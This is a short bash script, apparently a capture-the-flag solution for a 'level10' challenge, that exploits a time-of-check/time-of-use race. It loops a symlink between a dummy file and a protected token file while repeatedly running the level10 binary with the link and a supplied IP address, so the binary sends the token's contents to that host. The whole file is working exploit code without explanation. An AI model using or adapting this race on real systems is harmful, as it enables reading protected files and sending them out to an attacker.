#!/bin/bash

if [ "$#" -ne 1 ]
then
	echo "Exploit need an IP address"
	exit 1
fi

touch /tmp/file
ln -sf /tmp/file /tmp/file.ln 2>/dev/null

function replacer() {
	while true
	do
		ln -sf /tmp/file /tmp/file.ln 2>/dev/null
		ln -sf /home/user/level10/token /tmp/file.ln 2>/dev/null
	done
}

function sender() {
	while true
	do
		/home/user/level10/level10 /tmp/file.ln $1 &>/dev/null
	done
}

sender $1 &
trap "kill -9 $!; exit" INT
replacer
